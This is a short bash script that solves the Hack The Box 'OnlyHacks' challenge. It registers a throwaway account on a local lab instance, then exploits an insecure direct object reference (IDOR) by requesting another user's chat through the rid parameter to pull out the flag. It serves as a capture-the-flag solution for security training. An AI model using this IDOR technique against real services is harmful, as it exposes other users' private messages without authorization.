#!/bin/bash
# https://app.hackthebox.com/challenges/OnlyHacks
# Tags: Insecure Direct Object Reference, IDOR

TARGET=127.0.0.1:1337
curl -s -o /dev/null -c cookies.txt "http://$TARGET/register" \
    -F username=$RANDOM \
    -F password=pass \
    -F email=$RANDOM@email.com \
    -F age=30 \
    -F bio=Bio \
    -F user-gender=Male \
    -F interested-gender=Female \
    -F profile-picture=@profile.png && \
FLAG=$(curl -s -b cookies.txt http://$TARGET/chat/?rid=3 | grep -oP 'HTB\{.*?\}')
rm -f cookies.txt

echo -e "[\u2714] Flag captured: \e[1;37m$FLAG\e[0m"
